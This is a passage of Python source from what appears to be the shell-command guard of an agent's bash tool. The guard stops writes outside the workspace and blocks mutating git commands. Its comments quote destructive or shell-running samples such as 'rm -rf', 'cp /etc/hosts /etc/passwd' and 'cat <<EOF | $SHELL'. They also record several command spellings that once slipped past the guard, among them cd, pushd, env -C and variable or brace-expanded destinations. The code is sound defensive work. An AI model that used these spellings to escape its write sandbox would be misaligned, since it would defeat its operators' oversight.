    if len(words) != len(prefix):
        return False                      # env prefix: `GIT_CONFIG_*` lives there
    if len(words) < 2 or words[1] not in subs:
        # The subcommand must be argv[0] after the tool. A global option there is
        # how `-c <name>=<value>` and `--config-env=` arrive, and a config value
        # can make the subcommand run a program (`core.editor`); refusing the
        # *position* instead of enumerating the options is the structural test.
        return False
    return _operand_names_stdin(words[2:])


def _heredoc_delimiters_read_as_data(line: str) -> list[str]:
    """Delimiters of the heredocs opened on ``line`` whose body is data.

    ``line`` is one line of the command (the shell reads a heredoc's body from
    the lines *after* the opener, which the caller walks). The consumer is the
    command word of the simple command that owns the ``<<``: for
    `cat <<EOF > out` that is `cat`.

    Two things this refuses to call a heredoc, both deliberate:

    * a ``<<`` that is not its own token — `grep -n "x <<EOF" f` keeps the
      operator inside the argument token, measured, so a *mention* of ``<<``
      in a string is not an opener (this is why the scan runs on tokens);
    * a delimiter that is not an identifier — `python3 -c 'print(1 << 2)'`
      must not open anything.

    And one thing it refuses to call data: an owning command that pipes
    anywhere. `cat <<EOF | $SHELL` feeds the very text we would stop reading
    into whatever the pipe names, and a pipe target spelled as a variable
    cannot be resolved statically, so a pipe forfeits the mask entirely.

    The consumer is judged per *invocation*, not per tool (issue #1320):
    `_owns_stdin_as_data` accepts a named data reader, or the narrower case of a
    message reader — `git commit` / `git tag` — whose invocation is nothing but
    the tool, that subcommand and an operand naming stdin.
    """
    toks = _split_command_tokens(line)
    segments: list[list[int]] = [[]]      # token indices, so the pipe test
    for idx, tok in enumerate(toks):      # can look past the segment
        if tok in _COMMAND_SEPARATORS:
            segments.append([])
        else:
            segments[-1].append(idx)
    out: list[str] = []
    for seg in segments:
        for pos, idx in enumerate(seg):
            if toks[idx] != "<<" or pos + 1 >= len(seg):
                continue
            delim = toks[seg[pos + 1]].lstrip("-")
            if not (delim and delim.isidentifier()):
                continue
            prefix = [toks[j] for j in seg[:pos]]
            if not prefix or not _owns_stdin_as_data(prefix):
                continue
            # A pipe anywhere after the opener forfeits the mask: `cat <<EOF |
            # $SHELL` (and `${SHELL}`, and any unresolved target) would run the
            # text this would stop scanning. The test looks at the whole line,
            # not the owning segment — the pipe is a segment separator, so the
            # segment itself never contains it (measured: the first version of
            # this function allowed `| $SHELL` for exactly that reason).
            if "|" in toks[idx:]:
                continue
            out.append(delim)
    return out


def _mask_data_heredoc_bodies(cmd: str) -> str:
    """Blank the heredoc bodies that no shell will execute, keeping the lines.

    Why this exists (measured against master ``e6eaa4e4`` in the ``read-only``
    tier, 2026-09-15): the scanners parse a command text with the tokenizer, and
    a heredoc body is part of that text — so a body was read as shell code by
    accident of *spelling*. A pure read paid for it:

      - `cat <<'EOF'` + a line `> quoted` + `EOF` → BLOCKED, "blocked
        destructive write targeting 'quoted'" — the target is prose;
      - `cat <<'EOF'` + `a -> b` + `EOF` → BLOCKED, targeting ``'b'``;
      - `cat <<'EOF'` + `rm -rf /tmp/x` + `EOF` → targets ``['/tmp/x', 'EOF']``,
        i.e. the *delimiter word* named as a write target — the exact thing
        issue #1162's docstring calls "a guard whose message points at a token
        that is not a path is a guard nobody can trust";
      - `cat <<'EOF'` + `git checkout .` + `EOF` → BLOCKED as a git mutator, so
        a document that merely *mentions* the command could not be written.

    The same text in the spelling the guard already reads correctly — a quoted
    argument (`python3 -c "print(1 > 0)"`) — is allowed, so this was not a
    safety margin being spent; it was one text judged two ways for its spelling.

    Masking (not deleting) keeps the line structure, which matters because the
    mutator scan treats a newline as a separator: a blank line is whitespace and
    invents no command.

    Boundaries, stated rather than implied — a body is masked only when ALL of
    these hold, and every one of them fails closed:

    1. the owning invocation reads its stdin as data — a named data reader
       (`_DATA_READER_CONSUMERS`), or the message-reader invocation of issue
       #1320 (`_owns_stdin_as_data`);
    2. its output is not piped (`| $SHELL` cannot be resolved statically);
    3. a terminator line exists (an unterminated opener is left alone);
    4. no shell wrapper or evaluator token appears anywhere **outside** the
       bodies — so `sh -c "$(cat <<EOF … )"`, `eval $X` and `cat <<EOF | sh`
       keep being scanned exactly as before.

    What this does *not* claim: a body fed to an interpreter is executable
    code, and an interpreter can write files. That boundary is unchanged and
    already documented — `python3 -c 'open("/tmp/x","w")'` is allowed today.
    """
    if "<<" not in cmd:
        return cmd
    lines = cmd.split("\n")
    regions: list[tuple[int, int]] = []
    i = 0
    while i < len(lines):
        dels = _heredoc_delimiters_read_as_data(lines[i])
        start = i + 1
        next_i = i + 1
        for delim in dels:
            end = next((j for j in range(start, len(lines))
                        if lines[j].strip() == delim), None)
            if end is None:
                break
            regions.append((start, end))
            start = end + 1
            next_i = end + 1
        i = next_i
    if not regions:
        return cmd
    body_lines = {k for a, b in regions for k in range(a, b)}
    for k, line in enumerate(lines):
        if k in body_lines:
            continue
        if any(_basename(t) in _SHELL_WRAPPERS or _basename(t) in _SHELL_EVALUATORS
               for t in _split_command_tokens(line)):
            return cmd
    return "\n".join("" if k in body_lines else line
                     for k, line in enumerate(lines))


_FD_PREFIX_BEFORE_REDIRECT_RE = re.compile(
    r"(?:^|(?<=[\s;|&()<>]))([0-9]+)(?=(?:>>|>&|>\||<>|<&|<|>))"
)


def _quoted_char_indexes(cmd: str) -> set[int]:
    """Indexes of ``cmd`` that sit inside a quote (or behind an escape).

    Asked by `_mask_fd_redirect_prefixes`, which must not touch text the shell reads
    as data: `echo "a 2>b"` and `cp src "d2>x"` carry digits beside a `>` that no
    shell will act on, and blanking them would rewrite the *name* the guard reports.
    """
    protected: set[int] = set()
    quote = ""
    i = 0
    while i < len(cmd):
        ch = cmd[i]
        if quote:
            protected.add(i)
            if ch == "\\" and quote == '"' and i + 1 < len(cmd):
                protected.add(i + 1)
                i += 2
                continue
            if ch == quote:
                quote = ""
            i += 1
            continue
        if ch == "\\" and i + 1 < len(cmd):
            protected.add(i)
            protected.add(i + 1)
            i += 2
            continue
        if ch in "'\"":
            quote = ch
            protected.add(i)
        i += 1
    return protected


def _separator_is_escaped(cmd: str, start: int) -> bool:
    """True when the word-boundary character before ``start`` is itself escaped.

    The shell ends a word at white space or a metacharacter *unless* that character is
    quoted or escaped, and an escaped one was never a boundary: in ``cp src dst\\ 2>…``
    the space belongs to the word ``dst 2``, so the digits after it do not begin one and
    masking them rewrites the name the guard reports (issue #1484).

    Escaped means an **odd** number of backslashes in front of the separator, which is
    the shell's own rule: ``x\\\\ 2>`` keeps a real separator (and a real descriptor)
    because the two backslashes are one literal backslash, and ``dst\\ 2>`` does not.
    """
    if start == 0:
        return False
    backslashes = 0
    j = start - 2
    while j >= 0 and cmd[j] == "\\":
        backslashes += 1
        j -= 1
    return backslashes % 2 == 1


def _mask_fd_redirect_prefixes(cmd: str) -> str:
    """Blank the digits of a descriptor prefix that is *attached* to its redirect.

    A destination verb's target is its last operand, and the operand collector stops
    at the redirect *operator* but not at the descriptor prefix in front of it — so
    the prefix was collected as an operand and, being last, was named as the
    destination. Measured on master `347f023e`, pure calls: `cp src dst 2>/dev/null`
    reported targets ``['2', '/dev/null']``, i.e. the real destination was dropped.
    Two directions follow from that one cause: the write is **allowed** where it must
    be refused (`cp /etc/hosts /etc/passwd 2>/dev/null` and
    `cp /etc/hosts ~/.emrg/config.toml 2>/dev/null` were both ALLOWED at
    `workspace-write`, the tier whose whole job is those two writes — issue #1468),
    and the descriptor is reported as the destination instead of the path.

    **Adjacency is the discriminator, and it is the shell's own.** The token stream
    cannot carry it: `2>/dev/null` and `2 >/dev/null` lex identically (``2``, ``>``,
    ``/dev/null``), because shlex splits punctuation either way. Ground truth from a
    scratch directory on this host, `/bin/bash`, read off disk: the first copies and
    sends stderr to the device, while the second **really creates a file named ``2``**
    — ``cp src 2 >/dev/null`` is `cp src 2` with its output redirected. So only a
    prefix with no separating whitespace is masked; `_FD_PREFIX_BEFORE_REDIRECT_RE`'s
    ``(?!…)`` is a *lookahead*, and white space between the digits and the operator
    makes it fail, which is why the spaced form keeps naming its file.

    **The digits must also begin a word**, and that is a second, independent
    discriminator — `-2>/dev/null` is a *word* `-2` followed by a redirect, not a
    descriptor. Found by running the counter-control rather than by reasoning about
    the first rule: with the lookbehind written as ``(?<![\\w])`` the mask blanked the
    digit of `-2` and `./2` as well, turning the operand `-2` into a token `-` and
    `./2` into `./` — a rewritten *name*, which is the one thing this mask must never
    do (it is applied so that two lexings of the same text stay index-aligned, and a
    name is what the host is shown). Ordinary shell word characters (`-`, `/`, `.`)
    are not separators, so the prefix is accepted only at the start of the command or
    after white space or a metacharacter — the set the shell itself uses to end a
    word. Both counter-controls are in the battery
    (`fd-swallows-the-destination-20260920.py`, rows `-2>` and the spaced form).

    This mirrors the rule the walk already applies to ``>&``'s *operand*
    (`_is_fd_operand`, issue #1275): the operator's spelling decides, never the
    operand alone, and `&>1` / `echo x > 1` keep naming the file called ``1``.

    Masking (not deleting) keeps every character offset, which `_fully_quoted_token_indexes`
    and `_escaped_word_indexes` rely on: they pair two lexings of *this same text* by
    index, so a text they both read stays consistent. Nothing the shell reads as data
    is touched — a digit inside quotes or behind an escape is skipped
    (`_quoted_char_indexes`).

    Applied by `_extract_write_targets` only. The mutator scan does not read operand
    positions, and the other callers of `_mask_data_heredoc_bodies` are left alone.

    Named limit, in the safe direction: a quoted or escaped operator is left to the
    walk's own quoting rules, so `echo '>' 2` still names nothing extra — the prefix
    here is always the digits that sit directly against an unquoted operator.

    An *escaped* separator is not a separator: the digits in `dst\\ 2>/dev/null` do not
    begin a word, because the space in front of them is part of the word `dst 2`. The
    lookbehind admits that space (it is white space), and `_quoted_char_indexes`
    protects the character *behind* the backslash — the space — not the digit that
    follows it, so the mask blanked the digit and the guard reported ``dst `` for a run
    that really created the file ``dst 2`` (issue #1484). `_separator_is_escaped`
    answers the shell's own rule, and the row is pinned beside `-2>` in
    `tests/test_bash_tool_sandbox.py`.
    """
    if not cmd:
        return cmd
    matches = [
        m for m in _FD_PREFIX_BEFORE_REDIRECT_RE.finditer(cmd)
        if m.start(1) not in _quoted_char_indexes(cmd)
        and not _separator_is_escaped(cmd, m.start(1))
    ]
    if not matches:
        return cmd
    out = list(cmd)
    for m in matches:
        for k in range(m.start(1), m.end(1)):
            out[k] = " "
    return "".join(out)


def _find_git_mutator(cmd: str, _depth: int = 0) -> str | None:
    """The first mutating git verb in ``cmd``, or None when there is none.

    Parses rather than scans (issues #1156 + #1159): every `git` invocation in
    a chained command is resolved to its verb and classified by effect. Returns
    a human-readable phrase for the block reason.

    Recurses into shell execution contexts (`sh -c <text>`, `eval <text>`), so
    a mutator that the shell will run is judged wherever it is written. Depth
    is capped rather than trusted: nesting is bounded by the shell itself, and
    a guard must terminate on adversarial input.

    Heredoc bodies that no shell executes are masked first, for the same reason
    as in `_extract_write_targets`: `cat <<EOF` + `git checkout .` + `EOF` is a
    document that mentions the command, not an invocation of it.
    """
    tokens = _tokenize_command(_mask_data_heredoc_bodies(cmd))
    for verb, rest in _git_verbs(tokens):
        hit = _git_invocation_is_mutator(verb, rest)
        if hit:
            return f"git {hit}"
    if _depth < 3:
        for nested in _nested_command_texts(tokens):
            hit = _find_git_mutator(nested, _depth + 1)
            if hit:
                return hit
    return None


# `pushd ±N` / `popd ±N`: an index into the shell's directory stack, not a
# directory (`pushd +1` rotates the stack by one). A path literally named `+1`
# is the only thing this reads wrongly, and it is read wrongly in the refusing
# direction, which is the side this walk takes.
_STACK_ENTRY_RE = re.compile(r"^[+-]\d+$")


def _move_destination_is_unresolved(expanded: str) -> bool:
    """Whether a move's destination is text no scope can turn into a directory.

    The two walks that place a move both end in a *join*: a destination that is
    not absolute is joined onto the directory in effect, and ``os.path.join(cwd,
    "$D")`` is a path **inside** the workspace. So an unresolved destination does
    not read as "unknown" — it reads as "inside", which is the one direction this
    guard must never drift in. Measured on master (issue #1357, all
    ``workspace-write``, nothing executed): ``D=../outside && cd "$D" && cat > f``,
    ``for d in <outside>; do cd "$d" && cat > f; done`` and ``cd "$(mktemp -d)" &&
    cat > f`` were all ALLOW while the shell writes outside the workspace.

    The class is the *lexeme* the shell would have to expand before the path
    exists, not a list of names — the same lesson `_PARAM_EXPANSION` records for
    program words. Both the environment and the command's own assignments have
    already been applied by the caller, so the rule is simply *anything left to
    expand*:

    - ``$NAME`` / ``${NAME}`` / ``${NAME<op>}`` — a name neither scope knows;
    - a **split** expansion: ``$(mktemp -d)`` reaches this walk as the token ``$``
      followed by ``mktemp`` and ``-d)``, because the tokenizer makes ``(`` and
      ``)`` punctuation. Checking only complete lexemes leaves that spelling open —
      measured while writing this rule: with the complete-lexeme version,
      ``cd $(mktemp -d) && cat > f`` was still ALLOW while its quoted spelling was
      refused. Any surviving ``$`` or backtick answers "unresolved", which is the
      conservative reading of unfinished text.
    - ``$(…)`` and its backquote spelling — a command substitution, whose value
      only running it would give.
    - a **brace list** (``{a,b}``, ``{1..3}``, ``{a,b}{c,d}``) — several words to
      the shell and one to this walk, expanded before the command runs (issue
      #1396). Measured on master ``67ba7f52``: ``cd {../emrg-1396-outside,sub} &&
      cat > f`` was ALLOW while the shell in the same tree wrote the file in the
      sibling directory, and ``{a,b}`` carries no ``$`` for the class above to
      catch.

    The price is stated rather than hidden: a *legitimate* computed move
    (``cd "$(git rev-parse --show-toplevel)"``, a directory a ``read`` filled in)
    is refused the same way, because the token stream cannot tell it from the
    escapes above without executing them; and a destination known to land in an
    allowed write root (``cd "$(mktemp -d)"``, which lands in the OS temp area) is
    refused with it, because *where* it lands is exactly what is unknowable here;
    and so is a brace list whose every spelling stays inside (``cd {a,b}``),
    because *which* spelling runs is unknowable in the same way.
    That is the trade this guard already
    makes one branch over — a write target rooted in a variable neither scope can
    resolve fails closed ("a target whose root cannot be resolved is not one the
    guard can prove stays in the workspace") — and ``cd -`` is refused for exactly
    this reason already. The work-around the caller keeps is the one every refusal
    here has: spell the target absolutely.
    """
    return (
        "$" in expanded
        or "`" in expanded
        or bool(_BRACE_EXPANSION_RE.search(expanded))
    )


def _cwd_left_workspace(
    cmd: str, workspace: str, _depth: int = 0, _base: str | None = None
) -> str | None:
    """The directory a command moves the shell into, when it is outside the workspace.

    The ``workspace-write`` boundary reads a *relative* write target as "inside
    the workspace, because the cwd is the workspace root". That premise holds
    only while the command writes from where it started: ``cd <dir>``,
    ``pushd <dir>`` and ``env -C <dir>`` (every spelling of it, the attached
    ``-C<dir>`` included) move the shell first, so every later
    target is relative to the new directory. Measured on master, `cd /elsewhere;
    echo x > out.txt` truncated `/elsewhere/out.txt` while the guard read
    `out.txt` as in-workspace and allowed it (issue #1244), and `pushd
    /elsewhere && echo x > out.txt` did the same through the third spelling
    (issue #1362) while `builtin cd /elsewhere && …` did it through a prefix the
    command-position rule did not read (`_COMMAND_WRAPPERS`).

    Returns the offending directory, or None when the command never leaves the
    workspace — a destination inside a trusted write zone or the OS temp root
    does not count, because the boundary already allows those as write roots.
    The walk is conservative in one direction: *any* move outside counts, even
    one a later ``cd`` returns from, because the token stream does not say which
    segment a target belongs to without re-deriving the parse, and refusing is
    the fail-closed side. A move the guard cannot resolve (`cd -`, whose target
    is $OLDPWD, and the stack forms `popd`, bare `pushd`, `pushd ±N`, whose
    targets are whatever an earlier ``pushd`` pushed) is reported by its own
    token and treated the same way: it cannot be proven to stay inside.

    The payload of a nested shell is read too (`sh -c 'cd /elsewhere; echo x >
    f'`, `env -C /elsewhere …`), since it runs with the same effect; depth is
    capped rather than trusted, because a guard must terminate on adversarial
    input.

    A destination the command spells with a variable is resolved against the
    command's own assignments as well as the environment — the scope the
    write-target rule reads (`_resolve_from_command_assignment`) — so
    `D=<dir> && cd "$D"` is a move this walk can place. Reading that scope in one
    place only is what let a correct refusal become an allowance: with the scope
    added for targets and not here, `D=<outside> && cd "$D" && T=<in-ws> && cat >
    "$T/f"` moved the shell out while the literal `$D` was joined onto the cwd and
    read as inside.

    A destination *neither* scope can decide is refused rather than joined onto
    the cwd (issue #1357): the join is what makes it dangerous, since
    ``os.path.join(cwd, "$D")`` is a path *inside* the workspace, so an unresolved
    move did not read as "unknown" but as "inside" — measured on master,
    `D=../outside && cd "$D" && cat > f`, `for d in <dir>; do cd "$d" && cat > f;
    done` and `cd "$(mktemp -d)" && cat > f` were all ALLOW while the shell writes
    outside the workspace. Refusing is the side this walk's own contract names (a
    move that cannot be proven to stay inside is the case `cd -` is refused for),
    and the price is stated rather than hidden: a *legitimate* computed move —
    `cd "$(git rev-parse --show-toplevel)"`, a directory a `read` filled in — is
    refused the same way, because the token stream cannot tell the two apart
    without running them. `_move_destination_is_unresolved` carries the class and
    the trade; the caller's work-around is to spell the write target absolutely.
    A directory the token stream cannot preserve is
    invisible here for the older reason: a Windows spelling `C:\\Users\\x`
    reaches the guard as `C:Usersx` — backslash is shlex's escape character — so
    it is not read as an absolute path at all (issue #1261). Forward-slash
    spellings, relative moves and `..` are unaffected.

    The stack forms are refused rather than placed, and the price is the mirror
    of the one above: every form whose destination is an earlier `pushd`'s is
    answered by the verb, so a command that *returns* to the directory it started
    in is refused as well — measured, `pushd <inside>/sub && popd && echo x > f`
    creates `f` inside the workspace and is still refused, at the `popd`, and
    `pushd <outside> && popd && echo x > f` is refused one statement earlier, at
    the `pushd` itself, exactly as the `cd <outside>; cd <back>` spelling is.
    Refusing is the side the contract names, and the work-around is one the
    caller already has: spell the write target absolutely. `pushd -n <dir>`,
    which pushes without moving, is read as a move for the same reason — flags
    are skipped, not interpreted.
    """
    allowed = [workspace] + list(_trusted_write_zones()) + list(_temp_write_roots())
    cwd = os.path.realpath(_base) if _base else os.path.realpath(workspace)

    def leaves_workspace(path: str) -> bool:
        return not any(src and (_is_within(path, src) or path == src) for src in allowed)

    def resolve(tok: str) -> "str | None":
        expanded = os.path.expanduser(os.path.expandvars(tok))
        if _UNRESOLVED_VAR_RE.search(expanded):
            # The environment is not the only resolution scope (issue #1316's
            # rule, read the other way round here): a variable the command
            # itself assigned in an earlier statement is one the shell resolves
            # at this move too, so `D=<dir> && cd "$D"` is a move this walk can
            # place. Without it the literal `$D` is joined onto the cwd, which
            # makes *any* such move read as "still inside the workspace" — the
            # same scope the write-target rule had just been taught, so the
            # asymmetry turned a correct refusal into an allowance: measured,
            # `D=<outside> && cd "$D" && T=<in-ws> && cat > "$T/f"` is BLOCK
            # before the target-side scope and was ALLOW with it.
            from_command = _resolve_from_command_assignment(cmd, tok)
            if from_command is None:
                # Neither scope decides it, so this walk cannot place the move:
                # `None` rather than a path joined onto the cwd, which would read
                # as "inside the workspace" (issue #1357). The caller reports the
                # move it could not place.
                return None
            expanded = os.path.expanduser(os.path.expandvars(from_command))
        if _move_destination_is_unresolved(expanded):
            return None
        if not _is_absolute_path(expanded):
            expanded = os.path.join(cwd, expanded)
        return os.path.realpath(expanded)

    tokens = _split_command_tokens(_mask_data_heredoc_bodies(cmd))
    for i, tok in enumerate(tokens):
        word = _command_word(tok)
        if word not in ("cd", "pushd", "popd", "env") or not _runs_as_a_command(
            tokens, i
        ):
            continue
        args = _args_after_command(tokens, i)
        if word in ("pushd", "popd"):
            # `pushd <dir>` moves the shell exactly as `cd <dir>` does — the same
            # move, a third spelling — so it is placed the same way. Every other
            # form names an entry of the shell's *directory stack* instead of a
            # directory: `popd` returns to whatever an earlier `pushd` pushed,
            # a bare `pushd` swaps the top two entries, and `pushd ±N` rotates
            # the stack by index. The stack is a value this token stream does not
            # carry, which is the case `cd -` is refused for one case down, and
            # refusing is this walk's fail-closed side (issue #1362).
            operand = next((a for a in args if not a.startswith("-") or a == "-"), None)
            if (
                word == "popd"
                or operand is None
                or operand == "-"
                or _STACK_ENTRY_RE.match(operand)
            ):
                return word
            cwd = resolve(operand)
            if cwd is None:
                # A destination neither scope decides (issue #1357): the move is
                # reported by the operand it could not place, the way `cd -` is
                # reported by its token. Joining it onto the cwd would read the
                # move as "inside the workspace" while the shell writes outside.
                return operand
            if leaves_workspace(cwd):
                return cwd
            continue
        if word == "cd":
            operand = next((a for a in args if not a.startswith("-") or a == "-"), None)
            if operand is None:
                # A bare `cd` goes $HOME — outside the workspace unless the
                # workspace *is* $HOME, which the containment test below decides.
                cwd = os.path.realpath(os.path.expanduser("~"))
            elif operand == "-":
                # $OLDPWD: the guard has no way to know where that is.
                return "-"
            else:
                cwd = resolve(operand)
                if cwd is None:
                    return operand
            if leaves_workspace(cwd):
                return cwd
            continue
        # `env -C <dir>` / `env --chdir=<dir>` / `env -C<dir>`: the child of
        # `env` starts there.
        #
        # The attached short spelling was the one missing, and it is not a
        # cosmetic gap (issue #1391's mirror row, measured 2026-09-19):
        # `--chdir=` had been read since this rule was written while its short
        # twin had not, so `env -C<elsewhere> sh -c 'echo x > f'` was **ALLOW**
        # while the file really landed outside the workspace — a fail-open, and
        # one keystroke from a spelling the same walk refused. The shell's
        # ground truth for that row is pinned in
        # `tests/test_bash_tool_sandbox_cwd.py`.
        #
        # The bundle is read as well, because this host's `env` moves the child
        # for the bundled spelling too (`env -iC<dir> sh -c pwd` prints that
        # directory, measured), and *which* short options may precede the `C` is
        # the #461 enumeration this guard refuses to depend on. So any short
        # option token carrying a `C` means "everything after that `C` is the
        # directory", and a bundle ending in `C` takes the next token exactly as
        # the bare `-C` does. The price is stated rather than hidden: a token
        # carrying a `C` inside an option *value* (`env -uC<something>`) is read
        # as a move as well. That only ever *adds* a refusal, and only when the
        # value after the `C` spells a path outside the workspace — the
        # fail-closed direction this walk's contract names for every shape it
        # cannot resolve.
        for j, a in enumerate(args):
            target = None
            if a in ("-C", "--chdir"):
                target = args[j + 1] if j + 1 < len(args) else None
            elif a.startswith("--chdir="):
                target = a.split("=", 1)[1]
            elif a.startswith("-") and not a.startswith("--") and "C" in a[1:]:
                rest = a[a.index("C", 1) + 1:]
                target = rest if rest else (args[j + 1] if j + 1 < len(args) else None)
            if target is None:
                continue
            cwd = resolve(target)
            if cwd is None:
                return target
            if leaves_workspace(cwd):
                return cwd
    if _depth < 3:
        for nested in _nested_command_texts(tokens):
            hit = _cwd_left_workspace(nested, workspace, _depth + 1, cwd)
            if hit is not None:
                return hit
    return None


# Prefixes that run the word after them **in this shell**, so a move verb behind
# one is the same move (issue #1385). `builtin cd <dir>` and `command cd <dir>`
# move exactly as `cd <dir>` does — the prefix is a spelling of "resolve this as
# the builtin, not as a function", and the shell's own directory is what moves.
#
# Nothing else in `_COMMAND_WRAPPERS` is transparent here, and the difference is
# measured rather than argued: `env`, `sudo`, `timeout`, `xargs`, `nohup` and the
# `-exec` family hand the next word to ``execve``. A `cd` *program* may exist
# (macOS ships `/usr/bin/cd`), and `env cd sub` runs it in a child: the child
# chdirs, the shell that sets the redirect up does not move, and the file lands
# where the *start* directory says. Read the prefix as transparent and
# `env cd sub && echo x > ../f` — which really writes outside the workspace —
# comes back ALLOW (mutation arm 2 of issue #1385's measurement). `eval` is
# deliberately not here either: it does move the shell, but its payload reaches
# this walk as one opaque token (`eval 'cd sub'`) or as separate words whose
# nesting `_cwd_left_workspace` already refuses, so a token-level reading of it
# would cover the unquoted spelling only.
_CWD_TRANSPARENT_PREFIXES = frozenset({"builtin", "command"})


def _prefix_flag_runs_the_command(tok: str, prefix: str) -> bool:
    """True when a ``builtin``/``command`` flag token leaves the command running.

    Two of these flags still run the word after them — ``--``, which ends option
    parsing for both prefixes, and ``command``'s ``-p``, which asks for the
    default PATH — and the rest of each prefix's flag set means the word after it
    is **looked up** rather than run (``command -v``/``-V``) or **unregistered**
    rather than run (``builtin -d``/``-s``). Reading a move through one of those
    would invent a move the shell never made, which is why they are read no
    further here.

    Measured 2026-09-19 in ``/bin/sh`` and bash, which agree on every row, with
    the file's placement read back off disk and ``ws/sub`` present:

    * ``command -p cd sub && echo x > ../f``, ``command -- cd sub && …`` and
      ``builtin -- cd sub && …`` all leave the shell in ``sub``, so ``../f`` is
      ``ws/f`` — **inside**. Those are issue #1391's false blocks.
    * ``command -v cd sub && echo x > ../f``, its ``-V`` twin, ``command -pv …``
      and ``command -p -v …`` leave the shell where it was, so ``../f`` is beside
      the workspace: the refusal those rows already get is the correct one.
    * ``builtin -d``/``-s`` do not run their word at all, and ``command -X`` is
      rejected outright — both already refused, and correctly.

    ``-p`` is read as a *bundle of p's* (``-p``, ``-pp``, and a repeated ``-p``)
    rather than as a flag table: measured, all three still run the command, while
    a bundle that carries another letter (``-pV``) does not. An unknown flag
    stops the prefix — the fail-closed direction, since the reading cannot
    classify it.
    """
    if tok == "--":
        return True
    if prefix != "command":
        return False
    return len(tok) >= 2 and tok.startswith("-") and set(tok[1:]) == {"p"}


def _move_statement(statement: list[str]) -> tuple[bool, str | None]:
    """Whether a statement moves the shell's directory, and the operand it names.

    Two verbs spell the same move — ``cd <dir>`` and ``pushd <dir>`` (issue
    #1362) — and this is the vocabulary both walks read. ``pushd`` differs from
    ``cd`` in its *flags*, not in what follows them: every ``cd`` option is a
    preference modifier (``-P``, ``-L``, ``-e``) and the destination is the
    operand after it, while ``pushd``'s options all mean there is no placeable
    destination at all. ``pushd -n <dir>`` pushes the directory onto the stack
    and does *not* move, and ``pushd ±N`` rotates the stack by index. So a flag
    on ``pushd`` answers ``(True, None)`` — the shell is where it was, which is
    the same reading ``None`` gives the caller — rather than being skipped for
    the token after it, which is how ``pushd -n <dir>`` would name a directory
    the shell never entered.

    ``(False, None)`` is not a move at all. ``(True, None)`` is a move this walk
    cannot place, and the spellings that reach it are the ones a shell answers
    without a directory this guard can read: a bare ``cd`` (which goes
    ``$HOME``), ``cd -`` (``$OLDPWD``), and ``cd a b``, which the shell itself
    refuses ("too many arguments") — a move that did not happen leaves the shell
    where it was, so none of them may set a join base — plus ``pushd``'s stack
    forms above, whose destination is an entry an earlier ``pushd`` pushed.

    A prefix from `_CWD_TRANSPARENT_PREFIXES` does not change the answer: the
    move behind ``builtin``/``command`` is the same move, so the same operand is
    read through it. That is the symmetry this walk owes `_cwd_left_workspace`,
    which reads a command through `_runs_as_a_command` and therefore already saw
    ``builtin cd sub`` as a move — while this walk read no move, kept the start
    directory, and refused a write that really lands beside a subdirectory.
    Measured (issue #1385, `/bin/sh`, `ws/sub` present): ``builtin cd sub && echo
    x > ../f`` and ``command cd sub && echo x > ../f`` both create ``ws/f`` —
    inside — and both were BLOCK before this line, naming ``ws/../f``, a
    directory the file never appears in. The other rows of that issue's table
    hold: `command cd <outside> && echo x > <outside>/f` and the relative
    spelling of it stay refused, because a move this walk cannot place answers
    ``None`` however it was spelled.
    """
    i = 0
    while i < len(statement) and _is_env_assignment(statement[i]):
        i += 1
    # The prefix is transparent to the move (issue #1385): `builtin cd <dir>` and
    # `command cd <dir>` move *this* shell, which is the one that sets the
    # redirect up. Only those two — see `_CWD_TRANSPARENT_PREFIXES` for why a
    # word handed to `execve` must not be read through.
    while i < len(statement) and _command_word(statement[i]) in _CWD_TRANSPARENT_PREFIXES:
        prefix = _command_word(statement[i])
        i += 1
        # The prefix's own flags sit between it and the word it runs, and only
        # some of them still run it (issue #1391) — `command -p cd sub` moves the
        # shell exactly as `command cd sub` does. Reading past only those keeps
        # the rest of the flag set fail-closed: `command -v cd sub` looks its
        # word up instead of running it, so the move it looks like must not be
        # read through it.
        while i < len(statement) and _prefix_flag_runs_the_command(
            statement[i], prefix
        ):
            i += 1
    if i >= len(statement):
        return False, None
    verb = _command_word(statement[i])
    if verb not in ("cd", "pushd"):
        return False, None
    args = statement[i + 1:]
    # `--` ends option parsing, so what follows it is an operand even when it
    # looks like a flag (measured: `pushd -- <dir>` moves in sh, bash and zsh).
    # Read before the flag rule below, which would otherwise answer "no
    # placeable destination" for a move every shell makes.
    if args[:1] == ["--"]:
        args = args[1:]
    elif verb == "pushd" and any(a.startswith(("-", "+")) for a in args):
        return True, None
    operands = [a for a in args if not a.startswith("-") or a == "-"]
    if len(operands) != 1 or operands[0] == "-":
        return True, None
    return True, operands[0]


def _resolve_move_operand(cmd: str, cwd: str, operand: str) -> str | None:
    """Where a move's operand lands, or None when nothing can place it.

    The same resolution `_cwd_left_workspace` makes for the moves it reads —
    the environment, then the command's own earlier assignments (issue #1316's
    scope), then the directory in effect at the move. ``None`` is "not a
    directory this walk can name", never "keep the default".
    """
    expanded = os.path.expanduser(os.path.expandvars(operand))
    if _UNRESOLVED_VAR_RE.search(expanded):
        from_command = _resolve_from_command_assignment(cmd, operand)
        if from_command is None:
            return None
        expanded = os.path.expanduser(os.path.expandvars(from_command))
    if _move_destination_is_unresolved(expanded):
        # The mirror of `_cwd_left_workspace`'s answer for the same text (issue
        # #1357): `None` keeps the start directory, which is the join base this
        # walk falls back to whenever it cannot prove where the shell writes
        # from. Joining the literal `$(…)` onto the cwd instead would name a
        # directory that exists nowhere on disk and read the write as inside it.
        return None
    if not _is_absolute_path(expanded):
        expanded = os.path.join(cwd, expanded)
    return os.path.realpath(expanded)


def _cwd_at_write_site(cmd: str, workspace: str, token: str) -> str | None:
    """The directory the shell writes ``token`` *from*, when a move moved it.

    The mirror of `_cwd_left_workspace`: that one asks where a move takes the
    shell *out* of the workspace; this one where it takes it while staying
    inside. Both exist because the boundary joins a relative target onto the
    directory the child *starts* in, which is the right reading only while the
    command writes from where it started. Measured on master: ``cd sub && echo
    x > ../back.txt`` creates ``<workspace>/back.txt`` — inside — while the join
    onto the start directory reads ``<workspace>/../back.txt``, refuses it, and
    names a directory the file never appears in (issue #1370). ``cd`` into a
    subdirectory and climbing back is the ordinary way to write *beside* a
    subdirectory rather than in it, so this is a refusal the caller can only
    work around by spelling the target absolutely.

    Both verbs that spell that move are read — ``cd <dir>`` and ``pushd <dir>``
    (`_move_statement`) — and the two must agree, because they name one question
    about one command: the walk that asks whether a move *leaves* the workspace
    follows the stack form too (issue #1362). Read the same way in only one of
    them, the third spelling gave the same command two answers. Measured with
    the shell, ``ws/sub`` inside the workspace and declared ``ws``:

